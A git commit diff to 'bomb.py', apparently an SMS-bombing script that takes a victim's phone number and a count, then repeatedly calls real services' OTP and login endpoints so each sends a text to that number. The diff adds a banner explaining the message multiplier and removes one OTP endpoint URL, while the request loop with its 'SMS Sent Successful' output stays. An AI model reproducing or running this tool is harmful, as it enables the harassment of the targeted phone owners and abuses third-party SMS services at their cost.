3dd6e6b491bd4012135732339270efe0d11f0000
blackdark23 <88684413+blackdark23@users.noreply.github.com>
2021-09-02 23:14:48 +0600

    Update bomb.py

--- bomb.py
+++ bomb.py
@@ -11,7 +11,9 @@ W = '\033[1;37m'
 os.system("python2 logo.py")
 
 number=str(input(C + "Enter Your Number: "))
-
+print("")
+print(Y + "3 times as much as you give.For example: 10 × 3 = 30.If you give 10 massage  30 will send the message.")
+print("")
 amount=int(input(C + "Enter Amount: "))
 #1 
 
@@ -31,12 +33,12 @@ headers2["Content-Type"] = "application/x-www-form-urlencoded"
 headers2["Content-Length"] = "0"
 
 #3 
-api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp
+
 
 
 for j in range(amount):
     resp = requests.post(binge1, headers=headers1, data=data1)
     resp1 = requests.post(url, headers=headers2)
-    requests.get(api)
+
     
     print(G + "[✓]"+str(j+1)+" SMS Sent Successful...")
